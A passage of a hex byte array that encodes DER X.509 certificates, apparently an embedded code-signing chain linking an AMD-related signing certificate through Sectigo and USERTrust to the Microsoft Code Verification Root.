		0x39, 0x99, 0x71, 0x36, 0x05, 0x65, 0xAF, 0x30, 0x18, 0x4F, 0x05, 0x2C, 0x3D, 0x76, 0x9E, 0xB8, 0x01, 0xC8, 0x71, 0xA1, 0xEE, 0xD1, 0xCF, 0x8A, 0xA5, 0x00, 0x7B, 0x25, 0x44, 0xB1, 0xD1, 0x79, 0x17, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82,
		0x01, 0xAD, 0x30, 0x82, 0x01, 0xA9, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x0E, 0xE1, 0x3A, 0xA8, 0x53, 0x3A, 0x31, 0xD5, 0x8A, 0xBE, 0xC1, 0xBB, 0xAD, 0x67, 0x1A, 0x03, 0x85, 0xAD, 0x34, 0x0E, 0x30,
		0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0x48, 0x68, 0x06, 0x4A, 0x8F, 0x7C, 0x76, 0x82, 0xF1, 0x74, 0xB9, 0xB6, 0xF4, 0x62, 0xD7, 0xD9, 0x97, 0x88, 0xEE, 0xB7, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01, 0xFF,
		0x04, 0x04, 0x03, 0x02, 0x07, 0x80, 0x30, 0x0C, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x02, 0x30, 0x00, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x0C, 0x30, 0x0A, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03,
		0x03, 0x30, 0x11, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x86, 0xF8, 0x42, 0x01, 0x01, 0x04, 0x04, 0x03, 0x02, 0x04, 0x10, 0x30, 0x4A, 0x06, 0x03, 0x55, 0x1D, 0x20, 0x04, 0x43, 0x30, 0x41, 0x30, 0x35, 0x06, 0x0C, 0x2B, 0x06, 0x01, 0x04, 0x01,
		0xB2, 0x31, 0x01, 0x02, 0x01, 0x03, 0x02, 0x30, 0x25, 0x30, 0x23, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01, 0x16, 0x17, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x73, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x2E, 0x63,
		0x6F, 0x6D, 0x2F, 0x43, 0x50, 0x53, 0x30, 0x08, 0x06, 0x06, 0x67, 0x81, 0x0C, 0x01, 0x04, 0x01, 0x30, 0x43, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x3C, 0x30, 0x3A, 0x30, 0x38, 0xA0, 0x36, 0xA0, 0x34, 0x86, 0x32, 0x68, 0x74, 0x74, 0x70, 0x3A,
		0x2F, 0x2F, 0x63, 0x72, 0x6C, 0x2E, 0x73, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x53, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x52, 0x53, 0x41, 0x43, 0x6F, 0x64, 0x65, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x43,
		0x41, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x73, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x67, 0x30, 0x65, 0x30, 0x3E, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x32, 0x68, 0x74, 0x74, 0x70, 0x3A,
		0x2F, 0x2F, 0x63, 0x72, 0x74, 0x2E, 0x73, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x53, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x52, 0x53, 0x41, 0x43, 0x6F, 0x64, 0x65, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x43,
		0x41, 0x2E, 0x63, 0x72, 0x74, 0x30, 0x23, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x01, 0x86, 0x17, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6F, 0x63, 0x73, 0x70, 0x2E, 0x73, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x2E, 0x63,
		0x6F, 0x6D, 0x30, 0x1B, 0x06, 0x03, 0x55, 0x1D, 0x11, 0x04, 0x14, 0x30, 0x12, 0x81, 0x10, 0x65, 0x64, 0x64, 0x69, 0x65, 0x2E, 0x6C, 0x6F, 0x40, 0x61, 0x6D, 0x64, 0x2E, 0x63, 0x6F, 0x6D, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7,
		0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x84, 0x44, 0xE2, 0x68, 0xFF, 0x38, 0x1C, 0x91, 0x48, 0x98, 0x5F, 0x40, 0x8E, 0x5C, 0xC1, 0x45, 0x3A, 0x56, 0x0C, 0x9D, 0xD9, 0x4D, 0x2A, 0x6C, 0xFA, 0x01, 0xDD, 0x7F, 0x2A,
		0xDC, 0x8A, 0xF6, 0x33, 0x05, 0x3D, 0x2C, 0x79, 0x02, 0x7D, 0xB4, 0xF1, 0x85, 0xF4, 0x77, 0xB0, 0xD5, 0xDB, 0x8B, 0x36, 0x2B, 0x37, 0xDB, 0xD0, 0xD2, 0x58, 0x82, 0x38, 0x31, 0xAC, 0xE7, 0x05, 0x8B, 0xAF, 0x3F, 0xEB, 0x80, 0xA9, 0xEB, 0x2D,
		0xE9, 0xDD, 0x88, 0x6B, 0xCF, 0x39, 0x0F, 0xAE, 0x9B, 0x58, 0x6F, 0xC8, 0x33, 0xE6, 0x3D, 0xB5, 0xC6, 0xA0, 0x70, 0x19, 0xF3, 0x5A, 0x9F, 0xCE, 0x68, 0x99, 0x50, 0x28, 0x52, 0x73, 0x7B, 0x32, 0xD2, 0x5E, 0xA7, 0x83, 0x2C, 0x37, 0x86, 0xDF,
		0x06, 0x42, 0xD2, 0x16, 0x22, 0xE5, 0x6C, 0x0B, 0x01, 0x71, 0xE9, 0x6F, 0x95, 0x20, 0xD0, 0x7F, 0x73, 0x95, 0x03, 0x76, 0xFF, 0x55, 0x5B, 0xCF, 0x9C, 0x8A, 0x55, 0xBF, 0x4F, 0x86, 0xC0, 0x88, 0xB5, 0x8E, 0x2C, 0xB6, 0x25, 0xA0, 0xEF, 0x46,
		0x80, 0xED, 0x72, 0x81, 0xF0, 0x9A, 0x40, 0xC7, 0xBE, 0x9F, 0x69, 0xCB, 0xA7, 0x7A, 0x69, 0x67, 0x03, 0x0E, 0x39, 0xB2, 0xCF, 0xA4, 0x66, 0x92, 0x69, 0x8C, 0xED, 0x9E, 0x53, 0x47, 0xDD, 0x70, 0x56, 0xB4, 0x76, 0x54, 0x5C, 0x34, 0x42, 0xF9,
		0x34, 0xCB, 0x2C, 0x30, 0xCB, 0x98, 0x6A, 0xFA, 0xBD, 0x29, 0xA9, 0xA9, 0xE2, 0xEB, 0x28, 0xC5, 0xBD, 0x6E, 0xE4, 0x7D, 0xAB, 0xF5, 0xEF, 0x58, 0x7F, 0x85, 0x0E, 0xA4, 0x9B, 0x12, 0x4E, 0xB8, 0x68, 0xAA, 0xC6, 0x8D, 0xE9, 0x49, 0x61, 0x6D,
		0x08, 0xF8, 0x75, 0x19, 0x2B, 0x93, 0x38, 0x85, 0x49, 0xC7, 0x32, 0x7A, 0x3E, 0xF0, 0x85, 0xE2, 0x87, 0xD5, 0xA7, 0x43, 0x81, 0x0C, 0x15, 0x1B, 0x25, 0x0C, 0x64, 0x30, 0x82, 0x05, 0xF5, 0x30, 0x82, 0x03, 0xDD, 0xA0, 0x03, 0x02, 0x01, 0x02,
		0x02, 0x10, 0x1D, 0xA2, 0x48, 0x30, 0x6F, 0x9B, 0x26, 0x18, 0xD0, 0x82, 0xE0, 0x96, 0x7D, 0x33, 0xD3, 0x6A, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0C, 0x05, 0x00, 0x30, 0x81, 0x88, 0x31, 0x0B, 0x30, 0x09,
		0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0A, 0x4E, 0x65, 0x77, 0x20, 0x4A, 0x65, 0x72, 0x73, 0x65, 0x79, 0x31, 0x14, 0x30, 0x12, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13,
		0x0B, 0x4A, 0x65, 0x72, 0x73, 0x65, 0x79, 0x20, 0x43, 0x69, 0x74, 0x79, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x54, 0x68, 0x65, 0x20, 0x55, 0x53, 0x45, 0x52, 0x54, 0x52, 0x55, 0x53, 0x54, 0x20, 0x4E, 0x65, 0x74,
		0x77, 0x6F, 0x72, 0x6B, 0x31, 0x2E, 0x30, 0x2C, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x55, 0x53, 0x45, 0x52, 0x54, 0x72, 0x75, 0x73, 0x74, 0x20, 0x52, 0x53, 0x41, 0x20, 0x43, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69,
		0x6F, 0x6E, 0x20, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x30, 0x1E, 0x17, 0x0D, 0x31, 0x38, 0x31, 0x31, 0x30, 0x32, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A, 0x17, 0x0D, 0x33, 0x30, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x35,
		0x39, 0x35, 0x39, 0x5A, 0x30, 0x7C, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x47, 0x42, 0x31, 0x1B, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x12, 0x47, 0x72, 0x65, 0x61, 0x74, 0x65, 0x72, 0x20, 0x4D, 0x61,
		0x6E, 0x63, 0x68, 0x65, 0x73, 0x74, 0x65, 0x72, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x53, 0x61, 0x6C, 0x66, 0x6F, 0x72, 0x64, 0x31, 0x18, 0x30, 0x16, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x0F, 0x53, 0x65, 0x63,
		0x74, 0x69, 0x67, 0x6F, 0x20, 0x4C, 0x69, 0x6D, 0x69, 0x74, 0x65, 0x64, 0x31, 0x24, 0x30, 0x22, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1B, 0x53, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x20, 0x52, 0x53, 0x41, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20,
		0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x43, 0x41, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82,
		0x01, 0x01, 0x00, 0x86, 0x22, 0x8D, 0x32, 0x85, 0x7A, 0x18, 0x9F, 0x49, 0xF0, 0x96, 0x2F, 0x63, 0x08, 0x1E, 0x2D, 0xDC, 0x7C, 0x9F, 0x14, 0xCF, 0xE3, 0x26, 0xB6, 0x25, 0x66, 0x29, 0x40, 0x86, 0x54, 0x46, 0x74, 0x31, 0x62, 0xC5, 0x10, 0xED,
		0xB2, 0x87, 0x27, 0xA6, 0x99, 0xCB, 0x95, 0x30, 0xC0, 0x56, 0xF5, 0xA4, 0x75, 0xC6, 0xA9, 0x0E, 0x50, 0x62, 0xA5, 0x51, 0x91, 0x10, 0x6A, 0xE0, 0x4B, 0x62, 0xAE, 0xFD, 0xF0, 0xF8, 0x18, 0xAC, 0xA7, 0xFF, 0xEE, 0x2E, 0x33, 0x20, 0xFA, 0x0C,
		0x19, 0x89, 0xA8, 0x6C, 0x7B, 0xAD, 0x00, 0xC3, 0x61, 0xA1, 0xDC, 0x69, 0x65, 0x6D, 0x1F, 0x6E, 0x27, 0x96, 0xD7, 0x97, 0x51, 0x86, 0xA6, 0xF4, 0x27, 0xE5, 0x7C, 0x6A, 0x8B, 0x95, 0x1E, 0x5B, 0x60, 0xD5, 0x7E, 0xD7, 0x16, 0x92, 0x9C, 0x00,
		0x2F, 0x68, 0xF7, 0x97, 0xED, 0x6A, 0x72, 0xBE, 0x38, 0x3B, 0x63, 0xDE, 0x8F, 0xBF, 0x6E, 0x4C, 0x41, 0x5D, 0x12, 0x20, 0x08, 0x59, 0xE8, 0x39, 0xCD, 0x8F, 0xD2, 0xD6, 0xCF, 0x06, 0xB4, 0x57, 0x05, 0xB6, 0x4E, 0xA1, 0x3E, 0x57, 0x6B, 0x1F,
		0x98, 0xBC, 0xC4, 0x62, 0xD6, 0x1B, 0x0B, 0x8D, 0xC7, 0x66, 0x1B, 0x4A, 0x9F, 0x9D, 0x81, 0xC4, 0x72, 0x40, 0xB5, 0xE2, 0x5F, 0xEF, 0x0B, 0x45, 0xFF, 0xA3, 0xCE, 0x17, 0xA6, 0x2D, 0x55, 0xB0, 0xB7, 0xB0, 0xBC, 0x54, 0x6A, 0x9D, 0xBC, 0x8D,
		0x56, 0x53, 0xC6, 0xF0, 0xBA, 0x79, 0x50, 0x49, 0x2C, 0xF7, 0x03, 0xB9, 0xFE, 0x2F, 0x65, 0x35, 0xF2, 0x22, 0xEA, 0x2C, 0x07, 0xAF, 0x46, 0xD9, 0xF9, 0x46, 0x1C, 0xDC, 0x8C, 0x7C, 0x71, 0x28, 0xF3, 0xFE, 0xA7, 0xC6, 0x14, 0xDD, 0x55, 0x91,
		0x6E, 0x8A, 0x11, 0x0D, 0xDF, 0x06, 0x24, 0x95, 0x7D, 0x0F, 0xA7, 0xA1, 0x7C, 0x3A, 0xDA, 0x86, 0x35, 0x61, 0xD3, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0x64, 0x30, 0x82, 0x01, 0x60, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04,
		0x18, 0x30, 0x16, 0x80, 0x14, 0x53, 0x79, 0xBF, 0x5A, 0xAA, 0x2B, 0x4A, 0xCF, 0x54, 0x80, 0xE1, 0xD8, 0x9B, 0xC0, 0x9D, 0xF2, 0xB2, 0x03, 0x66, 0xCB, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0x0E, 0xE1, 0x3A, 0xA8,
		0x53, 0x3A, 0x31, 0xD5, 0x8A, 0xBE, 0xC1, 0xBB, 0xAD, 0x67, 0x1A, 0x03, 0x85, 0xAD, 0x34, 0x0E, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01, 0xFF, 0x04, 0x04, 0x03, 0x02, 0x01, 0x86, 0x30, 0x12, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01,
		0x01, 0xFF, 0x04, 0x08, 0x30, 0x06, 0x01, 0x01, 0xFF, 0x02, 0x01, 0x00, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x16, 0x30, 0x14, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05,
		0x07, 0x03, 0x08, 0x30, 0x11, 0x06, 0x03, 0x55, 0x1D, 0x20, 0x04, 0x0A, 0x30, 0x08, 0x30, 0x06, 0x06, 0x04, 0x55, 0x1D, 0x20, 0x00, 0x30, 0x50, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x49, 0x30, 0x47, 0x30, 0x45, 0xA0, 0x43, 0xA0, 0x41, 0x86,
		0x3F, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x6C, 0x2E, 0x75, 0x73, 0x65, 0x72, 0x74, 0x72, 0x75, 0x73, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x55, 0x53, 0x45, 0x52, 0x54, 0x72, 0x75, 0x73, 0x74, 0x52, 0x53, 0x41, 0x43, 0x65,
		0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x76, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x6A, 0x30, 0x68,
		0x30, 0x3F, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x33, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x74, 0x2E, 0x75, 0x73, 0x65, 0x72, 0x74, 0x72, 0x75, 0x73, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x55,
		0x53, 0x45, 0x52, 0x54, 0x72, 0x75, 0x73, 0x74, 0x52, 0x53, 0x41, 0x41, 0x64, 0x64, 0x54, 0x72, 0x75, 0x73, 0x74, 0x43, 0x41, 0x2E, 0x63, 0x72, 0x74, 0x30, 0x25, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x01, 0x86, 0x19, 0x68,
		0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6F, 0x63, 0x73, 0x70, 0x2E, 0x75, 0x73, 0x65, 0x72, 0x74, 0x72, 0x75, 0x73, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0C, 0x05, 0x00, 0x03,
		0x82, 0x02, 0x01, 0x00, 0x4D, 0x63, 0x50, 0xED, 0x47, 0x34, 0x4A, 0x61, 0xA4, 0xDB, 0xDE, 0x6A, 0x2A, 0x8C, 0x9B, 0xF1, 0x00, 0x00, 0x1E, 0x1D, 0x62, 0x7B, 0x3A, 0xD7, 0x32, 0xC2, 0xF6, 0xB3, 0xE0, 0x63, 0xB3, 0xFB, 0x61, 0x00, 0x88, 0x9A,
		0x1B, 0x6D, 0x10, 0x07, 0x04, 0x4F, 0xBE, 0xB8, 0xEA, 0x89, 0x78, 0x22, 0xEB, 0x0F, 0x46, 0xEC, 0xF3, 0x46, 0x5E, 0x40, 0x46, 0x89, 0x12, 0xF4, 0x0B, 0x77, 0x5A, 0x9C, 0x2A, 0x41, 0x3A, 0xFC, 0xD6, 0xF4, 0xEB, 0xE7, 0xF7, 0x15, 0x95, 0x33,
		0xC3, 0xA1, 0x83, 0x28, 0xB7, 0xDE, 0x2F, 0xE4, 0x94, 0xF7, 0x85, 0x33, 0x83, 0x2D, 0x4A, 0x40, 0x48, 0xBF, 0x9A, 0xC2, 0x4F, 0x4A, 0xB1, 0x8F, 0x24, 0xF4, 0xB3, 0x81, 0x37, 0xD3, 0xB7, 0x64, 0xB0, 0xA6, 0x23, 0x6A, 0x59, 0x68, 0x52, 0x42,
		0x5F, 0xFF, 0x04, 0xEB, 0xE1, 0x74, 0x65, 0x79, 0x08, 0xF5, 0xA9, 0x93, 0xDE, 0x6B, 0x71, 0x40, 0x99, 0x96, 0xBA, 0x78, 0xF1, 0xB9, 0xC8, 0xE2, 0xC3, 0x08, 0x16, 0xB1, 0xAB, 0x63, 0x5A, 0xC8, 0x15, 0x80, 0x6D, 0x74, 0x5E, 0x4A, 0x75, 0x7E,
		0xA5, 0xB8, 0xC3, 0x6C, 0xB5, 0xCF, 0xDF, 0x4A, 0x79, 0x87, 0x5C, 0xC7, 0x40, 0x4D, 0x63, 0x35, 0xF6, 0x30, 0xD3, 0xCF, 0xB5, 0x0A, 0x0E, 0x0B, 0x04, 0x7F, 0xA0, 0x4B, 0xAE, 0xBB, 0xA3, 0xA5, 0xD0, 0x84, 0x00, 0x93, 0x3E, 0x53, 0x5D, 0x34,
		0xA5, 0x00, 0x35, 0x69, 0x6C, 0xBE, 0x9F, 0x20, 0x25, 0x10, 0x0D, 0x19, 0xFB, 0x50, 0x90, 0x61, 0xBE, 0x39, 0x8F, 0x7A, 0x8E, 0x4D, 0xF6, 0x9F, 0x0E, 0x1E, 0xFE, 0x07, 0x51, 0x12, 0x66, 0x83, 0x26, 0x19, 0x48, 0x95, 0xCE, 0x4A, 0xC9, 0xC1,
		0x7F, 0xF3, 0x3A, 0x05, 0x9B, 0xF9, 0x6F, 0xDF, 0x88, 0x7F, 0xC0, 0x23, 0x9E, 0xD2, 0x1E, 0x43, 0x7A, 0x45, 0x31, 0xC1, 0x9C, 0x4D, 0xA9, 0xF0, 0x59, 0xB2, 0x59, 0x19, 0xE8, 0x6A, 0x8D, 0x29, 0x04, 0x02, 0x77, 0x7C, 0x4B, 0x4B, 0xCD, 0x70,
		0xBE, 0x3A, 0xB2, 0x55, 0x5A, 0x78, 0x3E, 0xBC, 0xBB, 0x6F, 0x03, 0x10, 0x25, 0x77, 0x15, 0x34, 0x8A, 0xF9, 0x36, 0xCC, 0x43, 0x92, 0xE4, 0xBA, 0x4F, 0xF1, 0x62, 0x93, 0x28, 0x25, 0x57, 0x29, 0xFB, 0x51, 0x19, 0xC7, 0xA1, 0x25, 0x40, 0x6A,
		0x84, 0x57, 0xC6, 0xB2, 0x9D, 0xB1, 0xBC, 0x1C, 0x0A, 0xDA, 0x7C, 0x67, 0x7E, 0x7D, 0x2E, 0xE9, 0x28, 0x4C, 0x18, 0x7E, 0xC4, 0x7B, 0x31, 0x41, 0x71, 0x9A, 0x4B, 0x29, 0xEC, 0x0B, 0x3D, 0x57, 0x50, 0xD2, 0xCA, 0xDD, 0xFD, 0x9E, 0x05, 0x51,
		0xE5, 0x44, 0x78, 0xDD, 0x01, 0xDE, 0xB1, 0x75, 0x98, 0x0D, 0x54, 0x24, 0xFD, 0xF0, 0x4E, 0xE3, 0xE2, 0xF8, 0x83, 0xBD, 0x72, 0xBA, 0xCB, 0x3D, 0x3A, 0xEE, 0xF0, 0x5E, 0x17, 0x92, 0x68, 0x6D, 0xC8, 0x61, 0xF9, 0xA6, 0xF1, 0x2A, 0x0A, 0x0B,
		0xA5, 0xB9, 0xF4, 0x9E, 0xEE, 0x98, 0x32, 0x05, 0x85, 0x9E, 0xEB, 0xF9, 0x83, 0x29, 0xD3, 0xC6, 0x2C, 0x7D, 0xBD, 0x3A, 0x77, 0x2E, 0x8B, 0x37, 0x42, 0xA0, 0x6A, 0x82, 0xED, 0x3B, 0x4A, 0xAA, 0x94, 0x10, 0xA4, 0xE1, 0x0D, 0xF8, 0x17, 0xC5,
		0xB6, 0x5A, 0x79, 0x33, 0x18, 0x92, 0xE3, 0xB5, 0x75, 0xF8, 0xA1, 0xE9, 0x8E, 0x0A, 0x25, 0x1E, 0xE4, 0x1E, 0xF1, 0x9F, 0x5A, 0x87, 0x23, 0xFF, 0x9F, 0xA4, 0x51, 0x9E, 0xFB, 0x39, 0x80, 0x11, 0xCD, 0xDB, 0xB5, 0xC4, 0xA7, 0xA8, 0x80, 0x6F,
		0xE5, 0x53, 0xD4, 0xE0, 0xE3, 0xA2, 0xC2, 0xD2, 0x5B, 0x1A, 0xFA, 0x32, 0x26, 0x2D, 0x6A, 0x57, 0x70, 0x1C, 0x3C, 0xA4, 0x58, 0x2E, 0xA3, 0xF3, 0x5B, 0x4B, 0x07, 0xDC, 0x32, 0x59, 0xF3, 0x87, 0xA7, 0x1A, 0x6D, 0x58, 0x30, 0x82, 0x06, 0x66,
		0x30, 0x82, 0x04, 0x4E, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x13, 0x33, 0x00, 0x00, 0x00, 0x44, 0xB7, 0x3F, 0xFC, 0xEF, 0x5A, 0xCF, 0xA2, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D,
		0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x7F, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F,
		0x6E, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20,
		0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x29, 0x30, 0x27, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x20, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x56, 0x65, 0x72,
		0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x52, 0x6F, 0x6F, 0x74, 0x30, 0x1E, 0x17, 0x0D, 0x31, 0x35, 0x30, 0x37, 0x32, 0x32, 0x32, 0x31, 0x30, 0x33, 0x34, 0x39, 0x5A, 0x17, 0x0D, 0x32, 0x35, 0x30, 0x37, 0x32, 0x32, 0x32,
		0x31, 0x30, 0x33, 0x34, 0x39, 0x5A, 0x30, 0x81, 0x88, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0A, 0x4E, 0x65, 0x77, 0x20, 0x4A, 0x65, 0x72,
		0x73, 0x65, 0x79, 0x31, 0x14, 0x30, 0x12, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x0B, 0x4A, 0x65, 0x72, 0x73, 0x65, 0x79, 0x20, 0x43, 0x69, 0x74, 0x79, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x54, 0x68, 0x65, 0x20,
		0x55, 0x53, 0x45, 0x52, 0x54, 0x52, 0x55, 0x53, 0x54, 0x20, 0x4E, 0x65, 0x74, 0x77, 0x6F, 0x72, 0x6B, 0x31, 0x2E, 0x30, 0x2C, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x55, 0x53, 0x45, 0x52, 0x54, 0x72, 0x75, 0x73, 0x74, 0x20, 0x52, 0x53,
		0x41, 0x20, 0x43, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x30, 0x82, 0x02, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01,
		0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x02, 0x0F, 0x00, 0x30, 0x82, 0x02, 0x0A, 0x02, 0x82, 0x02, 0x01, 0x00, 0x80, 0x12, 0x65, 0x17, 0x36, 0x0E, 0xC3, 0xDB, 0x08, 0xB3, 0xD0, 0xAC, 0x57, 0x0D, 0x76, 0xED, 0xCD, 0x27, 0xD3, 0x4C, 0xAD, 0x50,
		0x83, 0x61, 0xE2, 0xAA, 0x20, 0x4D, 0x09, 0x2D, 0x64, 0x09, 0xDC, 0xCE, 0x89, 0x9F, 0xCC, 0x3D, 0xA9, 0xEC, 0xF6, 0xCF, 0xC1, 0xDC, 0xF1, 0xD3, 0xB1, 0xD6, 0x7B, 0x37, 0x28, 0x11, 0x2B, 0x47, 0xDA, 0x39, 0xC6, 0xBC, 0x3A, 0x19, 0xB4, 0x5F,
		0xA6, 0xBD, 0x7D, 0x9D, 0xA3, 0x63, 0x42, 0xB6, 0x76, 0xF2, 0xA9, 0x3B, 0x2B, 0x91, 0xF8, 0xE2, 0x6F, 0xD0, 0xEC, 0x16, 0x20, 0x90, 0x09, 0x3E, 0xE2, 0xE8, 0x74, 0xC9, 0x18, 0xB4, 0x91, 0xD4, 0x62, 0x64, 0xDB, 0x7F, 0xA3, 0x06, 0xF1, 0x88,
